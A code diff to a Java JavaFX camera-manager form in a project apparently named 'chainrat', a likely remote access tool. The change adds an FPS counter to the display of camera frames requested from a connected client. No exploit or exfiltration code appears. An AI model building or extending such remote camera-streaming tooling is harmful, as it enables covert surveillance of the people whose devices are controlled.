@@ -1,5 +1,6 @@
 package com.nefi.chainrat.server.forms;
 
+import com.nefi.chainrat.server.FPSCounter;
 import com.nefi.chainrat.server.Main;
 import com.nefi.chainrat.server.log.Log;
 import com.nefi.chainrat.server.network.ControlServer.CommandType;
@@ -11,16 +12,21 @@ import com.sun.glass.ui.Size;
 import javafx.application.Platform;
 import javafx.collections.FXCollections;
 import javafx.collections.ObservableList;
+import javafx.embed.swing.SwingFXUtils;
 import javafx.event.ActionEvent;
 import javafx.fxml.Initializable;
 import javafx.scene.control.*;
 import javafx.scene.image.Image;
 import javafx.scene.image.ImageView;
+import javafx.scene.layout.StackPane;
 
 import javax.imageio.ImageIO;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayInputStream;
+import java.io.File;
+import java.io.IOException;
 import java.net.URL;
+import java.text.DecimalFormat;
 import java.util.Base64;
 import java.util.ResourceBundle;
 
@@ -34,6 +40,9 @@ public class frmCameraManager implements Initializable {
     public ImageView imageView;
     public TitledPane gPaneImage;
     public Button btnStopStream;
+    public StackPane imgStackPane;
+    public Label lbFPS;
+
 
     private Log log;
     private Connection connection;
@@ -42,6 +51,9 @@ public class frmCameraManager implements Initializable {
 
     private Size[] frontSizes = new Size[]{};
     private Size[] backSizes = new Size[]{};
+
+    private FPSCounter fpsCounter = new FPSCounter(5);
+    private DecimalFormat decimalFormat = new DecimalFormat("#.00");
 
     public frmCameraManager(Connection connection){
         this.connection = connection;
@@ -54,13 +66,15 @@ public class frmCameraManager implements Initializable {
         this.rbFront.setToggleGroup(this.toggleGroup);
         this.rbBack.setToggleGroup(this.toggleGroup);
         this.btnStartStream.setDisable(true);
+
+        //make image fit screen
+
         //Make request
         CameraRequest cr = new CameraRequest(true, false, 0, 0, false);
         Packet packet = new Packet(CommandType.CAMERA_REQUEST, Main.serialize(cr, CameraRequest.class));
 
         connection.channel.writeAndFlush(packet);
     }
-
     public void onImageReceived(String base64image){
         //Got image
         //Client:
@@ -70,7 +84,17 @@ public class frmCameraManager implements Initializable {
         //Log.d(TAG, "GOT IMAGE");
         byte[] pictureData = org.apache.commons.codec.binary.Base64.decodeBase64(base64image);
         Image img = new Image(new ByteArrayInputStream(pictureData));
+
+
+
+        fpsCounter.nextFrame();
         imageView.setImage(img);
+        Platform.runLater(new Runnable() {
+            @Override
+            public void run() {
+                lbFPS.setText(decimalFormat.format(fpsCounter.getAverageFps()) + " FPS");
+            }
+        });
     }
 
     public void onInfoReceived(CameraResponse packet){
